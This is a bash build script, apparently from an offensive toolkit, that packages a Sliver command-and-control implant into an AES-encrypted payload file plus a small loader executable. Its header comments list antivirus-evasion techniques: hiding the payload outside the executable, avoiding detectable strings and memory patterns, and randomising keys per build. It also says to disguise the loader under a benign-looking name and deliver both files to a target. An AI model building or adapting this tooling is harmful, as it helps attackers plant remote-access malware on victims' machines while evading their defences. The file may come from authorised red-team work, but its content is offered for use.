#!/usr/bin/env bash
#
# bundle-stager.sh — build the two-file Crystal Palace stager
#
# Outputs two files that must be delivered together:
#   stager.exe    — small loader (~17 KB), reads payload.dat and executes PICO
#   payload.dat   — AES-256-CBC encrypted PICO (opaque binary, no PE patterns)
#
# Evasion improvements over run.x64.exe / single-file embedded approach:
#   - stager.exe has no embedded payload → normal size (~60 KB) and entropy
#   - AES-256-CBC decryption (BCrypt) instead of a suspicious XOR loop
#   - No NtCreateSection / NtMapViewOfSection strings in .rdata
#   - VirtualAlloc(RW) + VirtualProtect(RX) — no PAGE_EXECUTE_READWRITE held
#   - payload.dat is opaque ciphertext: no PE headers, no Crystal Palace sigs
#   - Fresh random key+IV every build → unique stager.exe and payload.dat
#   - GUI subsystem, version info resource, advapi32 + bcrypt in IAT
#
# Usage:
#   ./bundle-stager.sh <implant.crystal.bin> [output-dir/stager.exe]
#
# Typical flow:
#   ./generate-implant.sh --dll /tmp/sliver.dll build/sliver.crystal.bin
#   ./bundle-stager.sh build/sliver.crystal.bin build/csvchelper.exe
#
# IMPORTANT: deliver stager.exe AND payload.dat from the same directory.
#   cp build/csvchelper.exe  /delivery/
#   cp build/payload.dat     /delivery/

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

PICO="${1:?Usage: bundle-stager.sh <implant.crystal.bin> [output.exe]}"
OUTPUT="${2:-$SCRIPT_DIR/build/stager.exe}"

if [[ ! -f "$PICO" ]]; then
    echo "error: PICO not found: $PICO" >&2
    exit 2
fi

PICO_ABS="$(cd "$(dirname "$PICO")" && pwd)/$(basename "$PICO")"
BUILD_DIR="$(cd "$(dirname "$OUTPUT")" && pwd)"
OUTPUT_ABS="$BUILD_DIR/$(basename "$OUTPUT")"
PAYDAT_ABS="$BUILD_DIR/payload.dat"

mkdir -p "$BUILD_DIR"

echo "[*] Building two-file stager..."
echo "    PICO:       $PICO_ABS ($(wc -c < "$PICO_ABS") bytes)"
echo "    stager.exe: $OUTPUT_ABS"
echo "    payload.dat: $PAYDAT_ABS"
echo ""

make -C "$SCRIPT_DIR/stager" \
    PICO="$PICO_ABS" \
    OUTPUT="$OUTPUT_ABS"

EXE_SIZE=$(wc -c < "$OUTPUT_ABS")
DAT_SIZE=$(wc -c < "$PAYDAT_ABS")
echo ""
echo "[+] Build complete"
echo "    stager.exe  : $OUTPUT_ABS  ($EXE_SIZE bytes)"
echo "    payload.dat : $PAYDAT_ABS  ($DAT_SIZE bytes)"
echo ""
echo "    Deliver BOTH files to the target (same directory)."
echo "    stager.exe resolves payload.dat relative to its own location."
echo ""
echo "    Rename stager.exe to match resource.rc OriginalFilename:"
echo "    e.g.  mv \$(basename "$OUTPUT_ABS") csvchelper.exe"
